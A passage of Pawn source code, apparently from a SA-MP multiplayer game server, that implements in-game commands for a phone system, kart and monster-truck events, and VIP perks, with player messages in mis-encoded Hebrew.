		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/resetwanted"))
	{
		if(!GetPlayerWantedLevel(playerid)) return SendClientMessage(playerid,red," .àéï ìê øîú îáå÷ùåú");
		if(GetMoney(playerid) < 1000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
		SetPlayerWantedLevel(playerid,0);
		playerinfo[playerid][wlevel] = 0;
		playerinfo[playerid][wantedlevel] = 0;
		GiveMoney(playerid,0-1000);
		SendClientMessage(playerid,green," .øîú äîáå÷ùåú ùìê éøãä");
		return 1;
	}
	if(equal(cmd,"/phone"))
	{
		new string[M_S];
		cmd = strtok(cmdtext, idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /phone [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /phone call [id/name] :ìäú÷ùø ìùç÷ï");
			SendClientMessage(playerid,white," /phone answer :ìòðåú ìèìôåï | ìäöèøó ìùéçú åòéãä");
			SendClientMessage(playerid,white," /phone hangup :ìðú÷ àú äèìôåï | ìöàú îùéçú åòéãä");
			SendClientMessage(playerid,white," /phone service [type] :ìäú÷ùø ìùéøåúéí îñåééîéí");
			//SendClientMessage(playerid,white," /phone conference [id/name] [id/name] [...] :éöéøú ùéçú åòéãä");
		}
		if(equal(cmd,"call"))
		{
			cmd = strtok(cmdtext, idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /phone call [id/name] :öåøú äùéîåù");
			new id = ReturnUser(cmd);
			if(!GetMoney(playerid)) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(id == playerid) return SendClientMessage(playerid,red," .àúä ìà éëåì ìäú÷ùø ìòöîê");
			if(playerinfo[playerid][calling] != -1)
			{
				format(string,sizeof(string)," .%s àúä ëáø îãáø áôìàôåï òí",GetName(playerinfo[playerid][calling]));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			if(playerinfo[id][calling] != -1)
			{
				format(string,sizeof(string)," .ëáø îãáø áôìàôåï òí ùç÷ï àçø %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			format(string,sizeof(string)," /phonehelp :îú÷ùø àìéê! | ìîéãò òì ô÷åãåú äôìàôåï øùåí %s",GetName(playerid));
			SendClientMessage(id,lightblue,string);
			format(string,sizeof(string)," ...%s àúä îú÷ùø ëòú àì",GetName(id));
			SendClientMessage(playerid,green,string);
	   		playerinfo[playerid][calling] = id;
	   		playerinfo[id][calling] = playerid;
			playerinfo[playerid][callid] = 1;
			playerinfo[playerid][caller] = 1;
		}
		else if(equal(cmd,"answer"))
		{
			if(playerinfo[playerid][calling] == -1 || playerinfo[playerid][caller]) return SendClientMessage(playerid,red," .àó àçã ìà îú÷ùø àìéê");
			if(playerinfo[playerid][canswer]) return SendClientMessage(playerid,lightblue," /phone hangup :àúä ëáø îãáø áôìàôåï. ìðéúå÷");
			format(string,sizeof(string)," .òðä ìê, àúä éëåì ìãáø òí ëúéáú äúå @ áúçéìú ëì äåãòä %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][calling],green,string);
			format(string,sizeof(string)," .àúä éëåì ìãáø òí ëúéáú äúå @ áúçéìú ëì äåãòä ,%s òðéú ì",GetName(playerinfo[playerid][calling]));
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][canswer] = 1;
			playerinfo[playerid][caller] = 0;
	  		playerinfo[playerinfo[playerid][calling]][canswer] = 1;
			playerinfo[playerinfo[playerid][calling]][callid] = 1;
		}
		else if(equal(cmd,"hangup"))
		{
			if(playerinfo[playerid][calling] == -1) return SendClientMessage(playerid,red," .àúä ìà îãáø áôìàôåï");
			format(string,sizeof(string)," .ðéú÷ àú äùéçä %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][calling],green,string);
			SendClientMessage(playerid,green," .ðéú÷ú àú äùéçä");
			playerinfo[playerinfo[playerid][calling]][calling] = -1;
			playerinfo[playerinfo[playerid][calling]][canswer] = 0;
			playerinfo[playerinfo[playerid][calling]][callid] = 0;
			playerinfo[playerinfo[playerid][calling]][caller] = 0;
			playerinfo[playerid][calling] = -1;
			playerinfo[playerid][canswer] = 0;
			playerinfo[playerid][callid] = 0;
			playerinfo[playerid][caller] = 0;
		}
		else if(equal(cmd,"service"))
		{
			cmd = strtok(cmdtext, idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /phone service [service name/number] :öåøú äùéîåù");
				SendClientMessage(playerid,white," /phone service police | /phone service 100 :îùèøä");
				SendClientMessage(playerid,white," /phone service hospital | /phone service 101 :áéú çåìéí");
				return 1;
			}
			if(equal(cmd,"police") || equal(cmd,"100"))
			{
				new cops = 0;
				format(string,sizeof(string)," --- !öøéê îùèøä %s ---",GetName(playerid));
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(playerinfo[i][work] == work_cop)
					{
						cops++;
						SendClientMessage(i,red,string);
					}
				}
				if(!cops) return SendClientMessage(playerid,red," .àéï ùåèøéí ëòú áùøú åìëï ääåãòä ìà ðùìçä");
			}
			else if(equal(cmd,"hospital") || equal(cmd,"101"))
			{
				new doctors = 0;
				format(string,sizeof(string)," --- !öøéê àîáåìðñ %s ---",GetName(playerid));
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(playerinfo[i][work] == work_doctor)
					{
						doctors++;
						SendClientMessage(i,red,string);
					}
				}
				if(!doctors) return SendClientMessage(playerid,red," .àéï øåôàéí ëòú áùøú åìëï ääåãòä ìà ðùìçä");
			}
			else return SendClientMessage(playerid,red," .àôùøåú ôìàôåï ùâåéä");
		}
		/*if(equal(cmd,"conference"))
		{
			new id;
			cmd = strtok(cmdtext, idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /phone conference [id/name] [id/name] [...] :öåøú äùéîåù");
			if(!GetMoney(playerid)) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
			while(strlen(cmd) > 0)
			{
				id = ReturnUser(cmd);
				if(!IsPlayerConnected(id)) return SendClientMessage(playerid,red," .àçã îäàééãééí ùâåé");
				if(id == playerid) return SendClientMessage(playerid,red," .àçã îäàééãééí äåà àúä - àéðê éëåì ìäú÷ùø ìòöîê");
				playerinfo[id][conference] = playerid;
				cmd = strtok(cmdtext,idx);
			}
			playerinfo[playerid][conference] = playerid;
			SendClientMessage(i,
		}*/
		else return SendClientMessage(playerid,red," .àôùøåú ôìàôåï ùâåéä");
		return 1;
	}
	if(equal(cmd,"/kart"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /kart [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /kart state :äðåëçéú Kart äöâú îöá úçøåú ä");
			SendClientMessage(playerid,white," /kart join :Kart äöèøôåú ìúçøåú ä");
			SendClientMessage(playerid,white," /kart quit :Kart ôøéùä îúçøåú ä");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /kart start :çãùä Kart äúçìú úçøåú");
				SendClientMessage(playerid,white," /kart end [reason] :äðåëçéú Kart ñéåí úçøåú ä");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(kartinfo[0])
			{
				if(kartinfo[2] > 1)
				{
					format(string,sizeof(string)," .åäéà úúçéì áòåã %d ùðéåú Kart éù ëòú úçøåú",kartinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .åäéà ëáø äúçéìä Kart éù ëòú úçøåú");
			}
			else SendClientMessage(playerid,red," .Kart àéï ëòú úçøåú");
		}
		else if(equal(cmd,"join"))
		{
			if(!kartinfo[0]) return SendClientMessage(playerid,red," .ëøâò Kart àéï úçøåú");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä ááçéøú äãîåéåú");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áîöá");
			if(playerinfo[playerid][waitkart]) return SendClientMessage(playerid,red," .úúçéì áòåã ëîä ùðéåú, àðà äîúï áñáìðåú Kart úçøåú ä");
			if(playerinfo[playerid][inkart]) return SendClientMessage(playerid,red," .Kart àúä ëáø áúçøåú ä");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .àúä ëáø áôòéìåú");
			if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áàéæåø ãé-àí");
			if(kartinfo[1] >= sizeof(KartPositions)-1) return SendClientMessage(playerid,red," .úôåñéí Kart ëì äî÷åîåú áúçøåú ä");
			if(kartinfo[2] <= 1) return SendClientMessage(playerid,red," .æîï ääöèøôåú òáø");
			if(GetMoney(playerid) < 300) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, äîçéø ìäöèøôåú ìôòéìåú äæå äåà 300$");
			SendClientMessage(playerid,green," .áäöìçä, àðà äîúï ìúçéìúä Kart äöèøôú ìúçøåú ä");
			GiveMoney(playerid,0-300);
			playerinfo[playerid][waitkart] = 1;
			playerinfo[playerid][kartv] = CreateVehicleEx(571,KartPositions[kartinfo[1]][0],KartPositions[kartinfo[1]][1],KartPositions[kartinfo[1]][2],KartPositions[kartinfo[1]][3],-1,-1,respawntime,0,world_kart);
			kartinfo[1]++;
			vehicleinfo[playerinfo[playerid][kartv]][kartdriver] = playerid;
			SendClientMessage(playerid,lightblue," ~~~ :Kart äöèøôú ìúçøåú ä ~~~");
			SendClientMessage(playerid,yellow,"  îèøúê äéà ìäúðâù áîúçøéí äàçøéí ùäöèøôå ìôòéìåú, åëê ìäòéó àåúí îäáðééï");
			SendClientMessage(playerid,yellow,"  îúçøä ùðåôì îäáðééï ðôñì, äàçøåï ùðùàø òì äáðééï îðöç");
			format(string,sizeof(string),"  äéðê îúçøä îñôø #%d",kartinfo[1]);
			SendClientMessage(playerid,pink,string);
			SendClientMessage(playerid,purple," » !áäöìçä, åîùç÷ îäðä");
		}
		else if(equal(cmd,"quit"))
		{
			if(!kartinfo[0]) return SendClientMessage(playerid,red," .ëøâò Kart àéï úçøåú");
			if(!playerinfo[playerid][inkart]) return SendClientMessage(playerid,red," .Kart àúä ìà áúçøåú ä");
			SendClientMessage(playerid,green," .Kart ôøùú îúçøåú ä");
			playerinfo[playerid][waitkart] = 0, playerinfo[playerid][inkart] = 0;
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			SetPlayerVirtualWorld(playerid,world_normal);
			SetFreeze(playerid,0);
			DestroyVehicleEx(playerinfo[playerid][kartv]);
			SpawnPlayer(playerid);
			vehicleinfo[GetPlayerVehicleID(playerid)][kartdriver] = INVALID_PLAYER_ID;
			kartinfo[1]--;
			playerinfo[playerid][inact] = 0;
			PlayerPlaySound(playerid,1063,0.0,0.0,0.0);
			if(kartinfo[1] == 1)
			{
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(IsPlayerConnected(i) && playerinfo[i][inkart])
					{
						format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~g~kart~w~!",GetName(i));
						MovingText(string,mt_activity);
						format(string,sizeof(string)," !Kart ðéöç áúçøåú ä %s",GetName(i));
						SendClientMessageToAll(yellow,string);
						SetPlayerInterior(i,0);
						DestroyVehicleEx(playerinfo[i][kartv]);
						SpawnPlayer(i);
						GiveMoney(i,40000);
						playerinfo[i][inkart] = 0, playerinfo[i][waitkart] = 0;
						kartinfo[0] = 0, kartinfo[1] = 0, kartinfo[2] = 0;
						playerinfo[i][inact] = 0;
						KillTimer(kartinfo[3]);
						PlayerPlaySound(i,1063,0.0,0.0,0.0);
					}
				}
			}
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			#endif
			if(kartinfo[0]) return SendClientMessage(playerid,red," .Kart ëáø éù úçøåú");
			if(ThereIsAct()) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú ôåòìú");
			StartKart();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			if(!kartinfo[0]) return SendClientMessage(playerid,red," .ëøâò Kart àéï úçøåú");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = " àéï";
			EndKart(reason,playerid);
		}
		else SendClientMessage(playerid,red," .ùâåéä Kart àôùøåú úçøåú");
		return 1;
	}
	if(equal(cmd,"/monster"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /monster [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /monster state :äðåëçéú Monster äöâú îöá úçøåú ä");
			SendClientMessage(playerid,white," /monster join :Monster äöèøôåú ìúçøåú ä");
			SendClientMessage(playerid,white," /monster quit :Monster ôøéùä îúçøåú ä");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /monster start :çãùä Monster äúçìú úçøåú");
				SendClientMessage(playerid,white," /monster end [reason] :äðåëçéú Monster ñéåí úçøåú ä");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(monsterinfo[0])
			{
				if(monsterinfo[2] > 1)
				{
					format(string,sizeof(string)," .ä÷øá éúçéì áòåã ,Monster éù ëòú úçøåú %d ùðéåú",monsterinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .åä÷øá ëáø äúçéì Monster éù ëòú úçøåú");
			}
			else SendClientMessage(playerid,red," .Monster àéï ëòú úçøåú");
		}
		else if(equal(cmd,"join"))
		{
			if(!monsterinfo[0]) return SendClientMessage(playerid,red," .ëøâò Monster àéï úçøåú");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä ááçéøú äãîåéåú");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áîöá");
			if(playerinfo[playerid][waitmonster]) return SendClientMessage(playerid,red," .úúçéì áòåã ëîä ùðéåú, àðà äîúï áñáìðåú Monster úçøåú ä");
			if(playerinfo[playerid][inmonster]) return SendClientMessage(playerid,red," .Monster àúä ëáø áúçøåú ä");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .àúä ëáø áôòéìåú");
			if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áàéæåø ãé-àí");
			if(monsterinfo[1] >= sizeof(MonsterPositions)-1) return SendClientMessage(playerid,red," .úôåñéí Monster ëì äî÷åîåú áúçøåú ä");
			if(monsterinfo[2] <= 1) return SendClientMessage(playerid,red," .æîï ääöèøôåú òáø");
			if(GetMoney(playerid) < 300) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, äîçéø ìäöèøôåú ìôòéìåú äæå äåà 300$");
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåõ ìøëá");
			SendClientMessage(playerid,green," .áäöìçä, àðà äîúï ìúçéìú ä÷øá Monster äöèøôú ìúçøåú ä");
			GiveMoney(playerid,0-300);
			ResetWeapons(playerid);
			playerinfo[playerid][waitmonster] = 1;
			monsterinfo[1]++;
			playerinfo[playerid][monsterv] = CreateVehicleEx(556,MonsterPositions[monsterinfo[1]][0],MonsterPositions[monsterinfo[1]][1],MonsterPositions[monsterinfo[1]][2],MonsterPositions[monsterinfo[1]][3],-1,-1,respawntime,0,world_monster);
			SendClientMessage(playerid,lightblue," ~~~ :Monster äöèøôú ìúçøåú ä ~~~");
			SendClientMessage(playerid,yellow,"  îèøúê äéà ìäúðâù áùàø äîúçøéí åòì éãéé ëê ìäùîéãí åìäôñéìí");
			SendClientMessage(playerid,yellow,"  äàçøåï ùðùàø çéé, îðöç");
			format(string,sizeof(string),"  äéðê îúçøä îñôø #%d",monsterinfo[1]);
			SendClientMessage(playerid,pink,string);
			SendClientMessage(playerid,purple," » !áäöìçä, åîùç÷ îäðä");
		}
		else if(equal(cmd,"quit"))
		{
			if(!monsterinfo[0]) return SendClientMessage(playerid,red," .ëøâò Monster àéï úçøåú");
			if(!playerinfo[playerid][inmonster]) return SendClientMessage(playerid,red," .Monster àúä ìà áúçøåú ä");
			SendClientMessage(playerid,green," .Monster ôøùú îúçøåú ä");
			playerinfo[playerid][waitmonster] = 0, playerinfo[playerid][inmonster] = 0;
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			SetPlayerVirtualWorld(playerid,world_normal);
			SetFreeze(playerid,0);
			vehicleinfo[GetPlayerVehicleID(playerid)][monsterdriver] = INVALID_PLAYER_ID;
			DestroyVehicleEx(playerinfo[playerid][monsterv]);
			SpawnPlayer(playerid);
			SetPlayerInterior(playerid,0);
			monsterinfo[1]--;
			playerinfo[playerid][inact] = 0;
			PlayerPlaySound(playerid,1086,0.0,0.0,0.0);
			if(monsterinfo[1] == 1)
			{
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(IsPlayerConnected(i) && playerinfo[i][inmonster])
					{
						format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~p~monster~w~!",GetName(i));
						MovingText(string,mt_activity);
						format(string,sizeof(string)," !Monster ðéöç áúçøåú ä %s",GetName(i));
						SendClientMessageToAll(yellow,string);
						SetPlayerInterior(i,0);
						DestroyVehicleEx(playerinfo[i][monsterv]);
						SpawnPlayer(i);
						GiveMoney(i,25000);
						playerinfo[i][inmonster] = 0, playerinfo[i][waitmonster] = 0;
						monsterinfo[0] = 0, monsterinfo[1] = 0, monsterinfo[2] = 0;
						playerinfo[i][inact] = 0;
						KillTimer(monsterinfo[3]);
						PlayerPlaySound(i,1086,0.0,0.0,0.0);
					}
				}
			}
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			#endif
			if(monsterinfo[0]) return SendClientMessage(playerid,red," .Monster ëáø éù úçøåú");
			if(ThereIsAct()) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú ôåòìú");
			StartMonster();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			if(!monsterinfo[0]) return SendClientMessage(playerid,red," .ëøâò Monster àéï úçøåú");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = " àéï";
			EndMonster(reason,playerid);
		}
		else SendClientMessage(playerid,red," .ùâåéä Monster àôùøåú úçøåú");
		return 1;
	}
	if(equal(cmd,"/viplist"))
	{
		new string[M_S], vips = 0;
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][vip] > 0) vips++;
		if(!vips) return SendClientMessage(playerid,red," .àéï ëòú îùúîùé ëáåã îçåáøéí");
		format(string,sizeof(string)," ~~~ :îùúîùé ëáåã îçåáøéí - %d ~~~",vips);
		SendClientMessage(playerid,lightblue,string);
		vips = 0;
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][vip])
			{
				vips++;
				if(playerinfo[i][vipmanager]) format(string,sizeof(string)," %d. %s [ID: %03d | VIP Level: %d | VIP Manager]",vips,GetName(i),i,playerinfo[i][vip]);
				else format(string,sizeof(string)," %d. %s [ID: %03d | VIP Level: %d]",vips,GetName(i),i,playerinfo[i][vip]);
				SendClientMessage(playerid,playerinfo[i][vipmanager] ? red : green,string);
			}
		}
		return 1;
	}
	if(equal(cmd,"/vbonus"))
	{
		new string[M_S], cur = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /vbonus [number] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /vbonus 1 :VIP áåðåñéí ëììééí ì");
			SendClientMessage(playerid,white," /vbonus 2 :äðçåú òì îçéøé ðù÷éí");
			SendClientMessage(playerid,white," /vbonus 3 :úåñôú òì ëñôéí îðëñéí");
			return 1;
		}
		switch(strval(cmd))
		{
			case 1:
			{
				SendClientMessage(playerid,lightblue," ~~~ :VIP áåðåñéí îéåçãéí ìîùúîùé ~~~");
				SendClientMessage(playerid,yellow,"  îéåçãú VIP ùéâåø ìîô÷ãú");
				SendClientMessage(playerid,yellow,"  äâðä îôðé èéìéí àåèåîèééí áîô÷ãä");
				SendClientMessage(playerid,yellow,"  (/viphelp ô÷åãåú ùåðåú îâðéáåú (øàä");
				SendClientMessage(playerid,yellow,"  úåñôú ëáåã áñèèéñèé÷åú");
				SendClientMessage(playerid,yellow,"  äðçåú òì îçéøé äðù÷éí");
				SendClientMessage(playerid,yellow,"  úåñôåú òì ëñôéí îðëñéí");
			}
			case 2:
			{
				SendClientMessage(playerid,lightblue," ~~~ :äðçåú òì îçéøé ðù÷éí ~~~");
				SendClientMessage(playerid,brown," (VIP Level. Percent Discounts)");
				cur = 0;
				for(new i=0;i<sizeof(VIP_WeaponDiscount);i++)
				{
					format(string,sizeof(string),!cur ? (" %s%d. %d %%") : ("%s | %d. %d %%"),string,i,VIP_WeaponDiscount[i]);
					cur++;
					if(cur >= 4)
					{
						SendClientMessage(playerid,yellow,string);
						string = "", cur = 0;
					}
					else if(i == sizeof(VIP_WeaponDiscount)-1) SendClientMessage(playerid,yellow,string);
				}
			}
			case 3:
			{
				SendClientMessage(playerid,lightblue," ~~~ :úåñôú àçåæéí òì ëñôéí îðëñéí ~~~");
				SendClientMessage(playerid,brown," (VIP Level. Percent Additions)");
				cur = 0;
				for(new i=0;i<sizeof(VIP_PropertyPercentAdditions);i++)
				{
					format(string,sizeof(string),!cur ? (" %s%d. %d %%") : ("%s | %d. %d %%"),string,i,VIP_PropertyPercentAdditions[i]);
					cur++;
					if(cur >= 4)
					{
						SendClientMessage(playerid,yellow,string);
						string = "", cur = 0;
					}
					else if(i == sizeof(VIP_PropertyPercentAdditions)-1) SendClientMessage(playerid,yellow,string);
				}
			}
			default: SendClientMessage(playerid,red," .àôùøåú òæøä ùâåéä");
		}
		return 1;
	}
	if(equal(cmd,"/fviplist") && IsPlayerMAdmin(playerid))
	{
		new File:f, string[M_S], read[M_S], vips = 0, index = 0, uname[256], lvl, id[32];
		fileCheck(file_vip);
		SendClientMessage(playerid,lightblue," ~~~ :VIP øùéîú îùúîùé ~~~");
		f = fopen(file_vip,io_read);
		while(fread(f,read,sizeof(read),false))
		{
		    vips++;
		    uname = strtok(read,index,'='), lvl = strval(strtok(read,index,'='));
		    format(string,sizeof(string),"/DM/Users/%s.ini",uname);
		    if(IsPlayerConnected(ReturnUser(uname))) valstr(id,ReturnUser(uname));
		    else id = "Not Connected";
		    charreplace(uname,'<','(');
		    charreplace(uname,'>',')');
		    format(string,sizeof(string),fexist(string) && fgetint(string,"VIPManager") ? (" %d. %s [ID: %s | VIP Level: %d | VIP Manager]") : (" %d. %s [ID: %s | VIP Level: %d]"),vips,uname,id,lvl);
			SendClientMessage(playerid,yellow,string);
			index = 0;
		}
		fclose(f);
		if(!vips) SendClientMessage(playerid,red," .VIP àéï îùúîùé");
		else
		{
		    format(string,sizeof(string)," .VIP ñê äëì %d îùúîùé",vips);
		    SendClientMessage(playerid,green,string);
		}
		SendClientMessage(playerid,lightblue," ~~~~~~~~~~~~~~~~~~~~");
		return 1;
	}
	if(equal(cmd,"/vip"))
	{
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .VIP áëãé ìäùúâø ìîô÷ãú ä VIP òìéê ìäéåú îùúîù");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
			{
				SetPlayerPos(playerid,viphq[vspos][0]+floatrand(-1.0,1.0),viphq[vspos][1]+floatrand(-1.0,1.0),viphq[vspos][2]);
				SetPlayerFacingAngle(playerid,viphq[vspos][3]);
			}
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),viphq[vspos][0]+floatrand(-3.0,3.0),viphq[vspos][1]+floatrand(-3.0,3.0),viphq[vspos][2]);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),viphq[vspos][3]);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),viphq[vint]);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),viphq[vworld]);
			}
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,viphq[vint]);
		SetPlayerVirtualWorld(playerid,viphq[vworld]);
		GameTextForPlayer(playerid,"~y~]~r~vip~h~s~n~~h~headquarter~y~]",1500,4);
		return 1;
	}
	if(equal(cmd,"/camera"))
	{
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .áëãé ìäùúîù áîöìîåú VIP òìéê ìäéåú îùúîù");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áîöìîåú ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áîöìîåú ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áîöìîåú ëàùø àúä ááçéøú ãîåéåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áîöìîåú ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][incam]) return SendClientMessage(playerid,red," /cameraoff :àúä ëáø öåôä áîöìîä, ìëéáåé");
		new string[M_S], count = sizeof(VIPCamera)-1, camid;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			format(string,sizeof(string)," /camera [0-%d] :öåøú äùéîåù",count);
			SendClientMessage(playerid,white,string);
			return 1;
		}
		camid = strval(cmd);
		if(camid < 0 || camid > count) return SendClientMessage(playerid,red," .îñôø îöìîä ùâåé");
		SavePlayerPos(playerid);
		playerinfo[playerid][incam] = 1;
		SetPlayerPos(playerid,VIPCamera[camid][0],VIPCamera[camid][1],VIPCamera[camid][2]+50.0);
		SetPlayerCameraPos(playerid,VIPCamera[camid][0],VIPCamera[camid][1],VIPCamera[camid][2]);
		SetPlayerCameraLookAt(playerid,VIPCamera[camid][3],VIPCamera[camid][4],VIPCamera[camid][5]);
		format(string,sizeof(string),"~y~]~r~camera~n~~h~number ~h~%d~y~]",camid);
		GameTextForPlayer(playerid,string,1500,4);
		return 1;
	}
	if(equal(cmd,"/cameraoff"))
	{
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .áëãé ìäùúîù áîöìîåú VIP òìéê ìäéåú îùúîù");
		if(!playerinfo[playerid][incam]) return SendClientMessage(playerid,red," .àéðê öåôä áîöìîä");
		SetCameraBehindPlayer(playerid);
		LoadPlayerPos(playerid);
		playerinfo[playerid][incam] = 0;
		return 1;
	}
	if(equal(cmd,"/valarm"))
	{
		cmd = strtok(cmdtext,idx);
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .áëãé ìäùúîù áô÷åãä æå VIP òìéê ìäéåú");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /valarm [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			playerinfo[playerid][valarm] = 1;
			SendClientMessage(playerid,green," .îöá äùîòú àæò÷ä äåôòì");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			fsetint(fuser(playerid),"VAlarm",playerinfo[playerid][valarm]);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][valarm] = 0;
			SendClientMessage(playerid,green," .îöá äùîòú àæò÷ä äåôñ÷");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			fsetint(fuser(playerid),"VAlarm",playerinfo[playerid][valarm]);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/vipcolor"))
	{
		cmd = strtok(cmdtext,idx);
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .áëãé ìäùúîù áô÷åãä æå VIP òìéê ìäéåú");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /vipcolor [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			SendClientMessage(playerid,vipcol," .äåôòì VIP öáò");
			SetPlayerColor(playerid,vipcol);
